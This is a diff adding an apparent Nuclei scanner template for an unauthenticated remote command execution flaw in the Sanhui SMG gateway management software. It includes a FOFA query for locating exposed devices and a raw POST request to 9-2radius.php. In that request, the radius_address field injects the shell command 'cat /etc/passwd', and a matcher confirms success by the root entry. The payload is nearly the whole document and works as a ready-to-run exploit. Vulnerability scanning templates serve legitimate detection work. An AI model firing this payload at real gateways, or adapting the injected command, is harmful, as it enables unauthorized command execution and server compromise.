@@ -1,0 +1,31 @@
+id: SMG-9-2radius_php-RCE
+
+info:
+  name: 三汇 SMG 网关管理软件 9-2radius.php 未授权RCE漏洞
+  author: Superhero
+  severity: high
+  description: |-
+    fofa: body="text ml10 mr20" && (title="网关管理软件" || title="Gateway Management")
+    三汇 SMG 网关管理软件 9-2radius.php 接口存在远程命令执行漏洞。攻击者可以通过漏洞执行任意命令从而获取服务器权限，可能导致内网进一步被攻击。
+  reference:
+    - https://mp.weixin.qq.com/s/VXL256Fbq7z3PClYn2CYGw
+  tags: RCE
+
+http:
+  - raw:
+      - |
+        POST /en/9-2radius.php?authority=6 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        save=1&enable_radius=1&radius_address=/';cat /etc/passwd;+#
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - 'root:.*:0:0'
+      - type: status
+        status: 
+          - 200
